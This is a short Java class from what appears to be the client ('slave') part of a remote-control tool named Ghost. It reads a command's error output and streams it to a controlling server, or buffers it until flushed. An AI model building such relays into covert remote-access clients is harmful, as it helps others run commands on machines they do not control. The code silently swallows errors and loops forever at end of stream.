package top.idoknow.ghost.slave.core;

import top.idoknow.ghost.slave.conn.HandleConn;
import top.idoknow.ghost.slave.func.FuncDefault;

import java.io.BufferedReader;

/**
 * 获取命令行输出的异常并输出
 * @author Rock Chin
 */
public class CmdError extends Thread{
    BufferedReader errReader;
    ProcessCmd processCmd;
    StringBuffer buffer=new StringBuffer("");
    public CmdError(BufferedReader errReader,ProcessCmd processCmd){
        this.errReader=errReader;
        this.processCmd=processCmd;
    }
    public void run(){
        try{
            String line;
            while (true){
                line=errReader.readLine();
                if(FuncDefault.amIFocused(processCmd))
                    HandleConn.writeToServer(line);
                else{
                    buffer.append(line);
                }
            }
        }catch (Exception e){}
    }
    public void flush() {
        try {
            HandleConn.writeToServer(buffer.toString());
        }catch (Exception ignored){}
        buffer=new StringBuffer();
    }
}
